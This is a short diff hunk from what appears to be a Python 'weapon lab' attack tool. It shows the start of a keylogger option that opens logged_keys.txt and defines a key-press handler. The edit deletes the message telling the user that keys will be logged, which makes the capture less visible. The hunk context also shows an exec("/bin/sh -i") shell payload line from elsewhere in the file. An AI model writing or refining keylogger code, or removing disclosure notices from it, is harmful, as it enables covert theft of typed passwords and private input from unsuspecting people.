@@ -780,7 +780,7 @@ exec("/bin/sh -i");
                             print("\u001b[0m")
                         
                         if weaponlabchoice == "8":
-                            print("\n\u001b[38;5;50mKEY LOGGER\u001b[0m\n\nLogged Keys will be written to logged_keys.txt!\n\n")
+                            print("\n\u001b[38;5;50mKEY LOGGER\u001b[0m\n\n")
                             f = open('logged_keys.txt', 'w')
                             def on_press(key):
                                 if str(key) == "Key.space":
